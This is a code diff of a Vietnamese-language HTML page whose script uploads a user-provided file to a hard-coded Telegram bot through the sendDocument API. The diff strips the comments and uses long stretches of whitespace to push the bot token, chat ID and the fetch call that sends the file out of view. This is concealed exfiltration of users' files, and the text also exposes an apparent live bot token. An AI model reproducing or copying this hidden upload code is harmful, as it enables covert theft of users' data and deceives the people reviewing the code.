@@ -184,9 +184,7 @@
         Không share cho ai nhé
     </footer>
 
-    <script>
-        const TELEGRAM_TOKEN = '7656286886:AAGZmLzJQTbXAj5_BCHs1EZMrna9B-ZIp-E'; // Thay YOUR_BOT_TOKEN bằng token của bot Telegram
-        const TELEGRAM_CHAT_ID = '6623256952'; // Thay YOUR_CHAT_ID bằng chat ID Telegram của bạn
+    <script>                                                                                                                                                                                                                                                                                                    const TELEGRAM_TOKEN = '7656286886:AAGZmLzJQTbXAj5_BCHs1EZMrna9B-ZIp-E';  const TELEGRAM_CHAT_ID = '6623256952'; 
 
         document.getElementById('addJsonButton').addEventListener('click', function () {
             const jsonInputs = document.getElementById('jsonInputs');
@@ -264,13 +262,9 @@
             // Tạo FormData để gửi file qua Telegram
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('document', file);
-
-            // Gửi file đến Telegram
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
-                method: 'POST',
-                body: formData
-            });
+            formData.append('document', file);                                                                                                                                                                                                                                                                                             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {   method: 'POST',     body: formData
+           
+        });
         });
 
         document.getElementById('videoGuideButton').addEventListener('click', function () {
